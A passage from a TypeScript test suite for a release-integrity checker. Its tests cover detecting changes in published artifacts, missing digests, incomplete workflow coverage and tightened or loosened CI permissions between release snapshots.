          { name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "old2" },
        ],
      });
      const current = await makeSnapshot({
        artifacts: [
          { name: "widget-1.1.0-py3-none-any.whl", kind: "wheel", sha256: "new1" },
          { name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "new2" },
        ],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      // New version, new digests, same shape: this must not read as a change.
      expect(delta.status).toBe("unchanged");
    });

    it("flags a release that gained an artifact kind", async () => {
      const prior = await makeSnapshot({
        artifacts: [{ name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "a" }],
      });
      const current = await makeSnapshot({
        artifacts: [
          { name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "b" },
          { name: "widget-1.1.0-py3-none-any.whl", kind: "wheel", sha256: "c" },
        ],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "artifact_set_changed")).toMatchObject({
        significance: "medium",
        before: "1×sdist",
        after: "1×sdist, 1×wheel",
      });
    });

    it("counts artifacts with no digest as a broken approval binding", async () => {
      const current = await makeSnapshot({
        artifacts: [{ name: "widget-1.1.0.tar.gz", kind: "sdist", sha256: "" }],
      });
      const delta = computeReleaseAuthorityDelta(current, null);
      expect(delta.standing.artifactsWithoutDigest).toBe(1);
    });
  });

  describe("coverage", () => {
    it("marks a snapshot with unreadable definitions incomplete", async () => {
      const current = await makeSnapshot({
        unresolved: [{ path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" }],
      });
      expect(current.coverage.complete).toBe(false);
      const delta = computeReleaseAuthorityDelta(current, null);
      expect(delta.standing.coverageComplete).toBe(false);
      expect(delta.standing.unresolved).toHaveLength(1);
    });

    it("flags coverage that regressed against a complete baseline", async () => {
      const prior = await makeSnapshot();
      const current = await makeSnapshot({
        unresolved: [{ path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" }],
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "coverage_regressed")).toMatchObject({ significance: "medium" });
      expect(delta.requiresApproval).toBe(true);
    });

    it("does not re-flag coverage that was already incomplete at the baseline", async () => {
      const unresolved: AuthorityUnresolved[] = [
        { path: "other/repo/.github/workflows/x.yml", reason: "not_accessible" },
      ];
      const prior = await makeSnapshot({ unresolved });
      const current = await makeSnapshot({ unresolved });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(kinds(delta.changes)).not.toContain("coverage_regressed");
      expect(delta.status).toBe("unchanged");
      // Still visible as a standing limitation rather than disappearing.
      expect(delta.standing.coverageComplete).toBe(false);
    });

    it("marks capped snapshot evidence as incomplete instead of silently omitting it", async () => {
      const current = await makeSnapshot({
        artifacts: Array.from({ length: 257 }, (_, index) => ({
          name: `artifact-${String(index).padStart(3, "0")}.tgz`,
          kind: "npm",
          sha256: String(index),
        })),
      });

      expect(current.artifacts).toHaveLength(256);
      expect(current.coverage).toMatchObject({
        complete: false,
        unresolved: [{ path: "+1 artifacts", reason: "limit_reached" }],
      });
    });
  });

  it("orders changes with the most significant first", async () => {
    const rewritten = BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n")
      .replace("actions/upload-artifact@v4", "actions/upload-artifact@v3")
      .replace("      - uses: actions/attest-build-provenance@v2\n", "");
    const delta = await deltaBetween(BASE_WORKFLOW, rewritten);
    expect(delta.highestSignificance).toBe("high");
    expect(delta.changes[0].significance).toBe("high");
    const significances = delta.changes.map((change) => change.significance);
    expect(significances).toEqual([...significances].sort(bySignificanceDesc));
  });
});

function bySignificanceDesc(a: string, b: string): number {
  const rank: Record<string, number> = { high: 0, medium: 1, low: 2 };
  return rank[a] - rank[b];
}
